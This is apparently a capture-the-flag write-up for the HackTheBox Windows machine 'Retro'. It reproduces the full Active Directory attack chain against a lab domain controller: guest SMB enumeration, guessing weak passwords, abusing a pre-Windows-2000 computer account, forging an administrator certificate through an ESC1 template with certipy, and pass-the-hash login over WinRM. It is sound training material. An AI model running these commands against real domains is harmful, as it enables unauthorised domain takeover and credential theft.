---
title: HTB: Retro
url: https://0xdf.gitlab.io/2025/06/24/htb-retro.html
date: 2025-06-24T09:00:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-retro, hackthebox, ctf, nmap, vulnlab, windows, active-directory, netexec, rid-cycle, pre-windows-2000, htb-vintage, changepasswd-py, certipy, adcs, esc1
---

![Retro](/img/retro-cover.png)

Retro starts with an SMB share and note about a trainee account that uses the username as the password. From there, I’ll find a machine account that’s old and has the pre-Windows 2000 password set. That account allows me access to ESC a vulnerable ADCS template, providing administrator access.

## Box Info

| Name | [Retro](https://hackthebox.com/machines/retro)  [Retro](https://hackthebox.com/machines/retro) [Play on HackTheBox](https://hackthebox.com/machines/retro) |
| --- | --- |
| Release Date | 24 Jun 2025 |
| Retire Date | 24 Jun 2025 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [r0BIT r0BIT](https://app.hackthebox.com/users/250152) |

## Recon

### Initial Scanning

`nmap` finds 22 open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.129.234.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 19:50 UTC
Nmap scan report for 10.129.234.44
Host is up (0.092s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
56349/tcp open  unknown
56358/tcp open  unknown
56917/tcp open  unknown
56930/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,9389 -sCV 10.129.234.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 19:51 UTC
Nmap scan report for 10.129.234.44
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-22 20:04:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-22T20:04:51+00:00
|_ssl-date: 2025-05-22T20:05:32+00:00; +12m17s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-08T01:55:44
|_Not valid after:  2025-10-08T01:55:44
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 12m16s, deviation: 0s, median: 12m16s
| smb2-time:
|   date: 2025-05-22T20:04:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.98 seconds

```

The box shows many of the ports associated with a [Windows Domain Controller](/cheatsheets/os#windows-domain-controller). The domain is `retro.vl`, and the hostname is `DC`.

I’ll use `netexec` to generate a `hosts` file line and add it to my `/etc/hosts`:

```

oxdf@hacky$ netexec smb 10.129.234.44 --generate-hosts-file hosts
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
oxdf@hacky$ cat hosts /etc/hosts | sponge /etc/hosts

```

### SMB - TCP 445

#### Enumeration

`netexec` without any creds is not able to enumerate SMB shares:

```

oxdf@hacky$ netexec smb dc.retro.vl --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

However, the guest account works:

```

oxdf@hacky$ netexec smb dc.retro.vl -u guest -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ 

```

In addition to the standard Windows DC shares, there’s `Notes` and `Trainees`. It appears that the guest account has no access to `Notes` and only read access to `Trainees`.

#### Trainees

The `Trainees` share contains a single text file:

```

oxdf@hacky$ smbclient //dc.retro.vl/Trainees -U 'guest%'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 21:58:43 2023
  ..                                DHS        0  Wed Apr  9 03:16:04 2025
  Important.txt                       A      288  Sun Jul 23 22:00:13 2023

                4659711 blocks of size 4096. 1280370 blocks available

```

I’ll download it:

```

smb: \> get Important.txt 
getting file \Important.txt of size 288 as Important.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)

```

The file is a note from the Admins to the Trainees:

> Dear Trainees,
>
> I know that some of you seemed to struggle with remembering strong and unique passwords.
> So we decided to bundle every one of you up into one account.
> Stop bothering us. Please. We have other stuff to do than resetting your password every day.
>
> Regards
>
> The Admins

#### User Enumeration

The `--users` flag isn’t able to read anything:

```

oxdf@hacky$ netexec smb dc.retro.vl -u guest -p '' --users
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 

```

I am able to RIDcycle:

```

oxdf@hacky$ netexec smb dc.retro.vl -u guest -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)

```

There’s a trainee user, which is likely what the note was referring to.

I’ll also note the RETRO\BANKING$ account, which looks like a machine account.

## Auth as BANKING$

### Auth as Trainee

Given the note, it seems reasonable that the password for the trainee account be something simple and potentially guessable. I’ll take a guess that it might be the account name, and it works:

```

oxdf@hacky$ netexec smb dc.retro.vl -u trainee -p trainee
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 

```

### Authenticated SMB Enumeration

The trainee account is able to read the `Notes` share:

```

oxdf@hacky$ netexec smb dc.retro.vl -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ  

```

The share contains two files:

```

oxdf@hacky$ smbclient //dc.retro.vl/Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 03:12:49 2025
  ..                                DHS        0  Wed Apr  9 03:16:04 2025
  ToDo.txt                            A      248  Sun Jul 23 22:05:56 2023
  user.txt                            A       32  Wed Apr  9 03:13:01 2025

                4659711 blocks of size 4096. 1279897 blocks available

```

I’ll download both:

```

smb: \> get user.txt 
getting file \user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get ToDo.txt 
getting file \ToDo.txt of size 248 as ToDo.txt (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec)

```

`user.txt` is the first flag:

```

oxdf@hacky$ cat user.txt
cbda362c************************

```

`ToDo.txt` is another note:

> Thomas,
>
> after convincing the finance department to get rid of their ancienct banking software
> it is finally time to clean up the mess they made. We should start with the pre created
> computer account. That one is older than me.
>
> Best
>
> James

### Pre-Windows-2000

#### Validate Password

I noted the extra computer in the domain above, and it’s named BANKING$, which matches with the note. Combining that with the hint in the note of ancient reminds of Pre-Windows 2000 computers. I exploited this in [Vintage](/2025/04/26/htb-vintage.html#analysis), and there’s a nice [TrustedSec post](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts) as well. These computer accounts use their hostname, all lowercase, as their password.

Trying that here fails, but with a different error than if I have the wrong password:

```

oxdf@hacky$ netexec smb dc.retro.vl -u 'BANKING$' -p banking
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
oxdf@hacky$ netexec smb dc.retro.vl -u 'BANKING$' -p oxdf
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:oxdf STATUS_LOGON_FAILURE 

```

That’s a good indication that it’s the correct password. In fact, the TrustedSec post addresses this:

> You will see the error message **STATUS\_NOLOGON\_WORKSTATION\_TRUST\_ACCOUNT** when you have guessed the correct password for a computer account that has not been used yet.

I’ll show two ways to get around this error - via password change and via Kerberos authentication.

#### via Password Change

The TrustedSec post goes on to say that to use this account, I’ll just need to change the password. I can’t do it over SMB (as it won’t accept the pre-2000 auth), but I can use one of several different protocols:

> 1. The NetUserChangePassword protocol
> 2. The NetUserSetInfo protocol
> 3. The Kerberos change-password protocol (IETF Internet Draft Draft-ietf-cat-kerb-chg-password-02.txt) - port 464
> 4. Kerberos set-password protocol (IETF Internet Draft Draft-ietf-cat-kerberos-set-passwd-00.txt) - port 464
> 5. Lightweight Directory Access Protocol (LDAP) write-password attribute (if 128-bit Secure Sockets Layer (SSL) is used)
> 6. XACT-SMB for pre-Microsoft Windows NT (LAN Manager) compatibility

The posts links to [this pull request into Impacket](https://github.com/fortra/impacket/pull/1304) which is closed saying that `changepasswd.py` can handle it.

If I try this with just the target and the new password, it crashes with the same error mentioned in the post:

```

oxdf@hacky$ changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                    
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
Traceback (most recent call last):  
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smbconnection.py", line 280, in login
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 1091, in login
    if packet.isValidAnswer(STATUS_SUCCESS):
       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                                                                             
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smb3structs.py", line 460, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)

```

However, in the help there’s an option for to set the protocol:

```
  -protocol {smb-samr,rpc-samr,kpasswd,ldap}, -p {smb-samr,rpc-samr,kpasswd,ldap}

```

I’ll use RPC:

```

oxdf@hacky$ changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.

```

It works:

```

oxdf@hacky$ netexec smb dc.retro.vl -u 'banking$' -p 0xdf0xdf
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\banking$:0xdf0xdf 

```

#### via Kerberos Auth

On originally publishing this post, I got [this reply from mpgn](https://x.com/mpgn_x64/status/1937982462660911440):

> you don't need to change the password of a pre2k computer account, just use kerberos ex:  
>   
> nxc smb ip -u server$ -p server -k   
>   
> if you want the tgt (for other tools)  
>   
> nxc smb ip -u server$ -p server -k --generate-tgt ticket  
>   
> I don't know why everyone is changing the password 🤷‍♂️
>
> — mpgn (@mpgn\_x64) [June 25, 2025](https://twitter.com/mpgn_x64/status/1937982462660911440?ref_src=twsrc%5Etfw)

That actually does work here (on a fresh boot of Retro):

```

oxdf@hacky$ netexec smb dc.retro.vl -u 'BANKING$' -p banking -k
SMB         dc.retro.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         dc.retro.vl     445    DC               [+] retro.vl\BANKING$:banking 

```

## Shell as Administrator

### Enumeration

BANKING$ has the same SMB access as Trainee. I don’t have a way to get a shell. I’ll turn to ADCS.

I have `certipy` search for any vulnerable templates:

```

oxdf@hacky$ certipy find -u 'BANKING$@retro.vl' -p 0xdf0xdf -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

It find a template that shows as vulnerable to ESC1.

If I had gone the Kerberos route instead of changing the password, the command would require adding `-k` and `-target dc.retro.vl`. Other `certipy` commands work as well, and may require adding an extra switch. Typically when it fails it says what argument needs to be added.

### ESC1

#### Background

There’s a lot in the `certipy` output. There’s a single CA named `retro-DC-CA`. It doesn’t show anything unusual.

There is one vulnerable template, `RetroClients`, which is configured with `Enrollee Supplies Subject`:

```

    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject

```

This means that the enrollee can specify what user they want the certificate for!

Additionally, the `Extended Key Usage` field is set to `Client Authentication`:

```

    Extended Key Usage                  : Client Authentication

```

This means that the certificate can be used to authenticating a user to a service. Without this, the resulting certificate wouldn’t be too valuable to me.

To enroll in this certificate, a user must be in one of these groups:

```

        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins

```

BANKING$ is in Domain Computers!

#### Exploit

I’ll use `certipy` to request a certificate, authenticating as BANKING$ but requesting the UPN of administrator@retro.vl:

```

oxdf@hacky$ certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): 
[-] Failed to request certificate

```

It fails. The public key length is too small for the template. In the `-h` for `certipy`, there’s a way to set this:

```
  -key-size RSA key length
                        Length of RSA key (default: 2048) 

```

I’ll double it, and it works:

```

oxdf@hacky$ certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Now I’ll use this certificate to auth as administrator:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information

```

This fails too. It says there’s a SID mismatch. I can try the request again, this time giving the SID as well. I’ll get the SID for the administrator user using `lookupsid.py`:

```

oxdf@hacky$ lookupsid.py retro.vl/BANKING$:0xdf0xdf@dc.retro.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at dc.retro.vl
[*] StringBinding ncacn_np:dc.retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)

```

Now I’ll make the request specifying the SID:

```

oxdf@hacky$ certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid  S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'

```

And now auth:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389

```

Finally I have both a TGT and the NTLM for administrator.

### Shell

This is all I need to WinRM with [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py):

```

oxdf@hacky$ evil-winrm-py -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v0.0.8
[*] Connecting to dc.retro.vl:5985 as administrator
evil-winrm-py PS C:\Users\Administrator\Documents>

```

And grab the root flag:

```

evil-winrm-py PS C:\Users\Administrator\desktop> cat root.txt
40fce9c3************************

```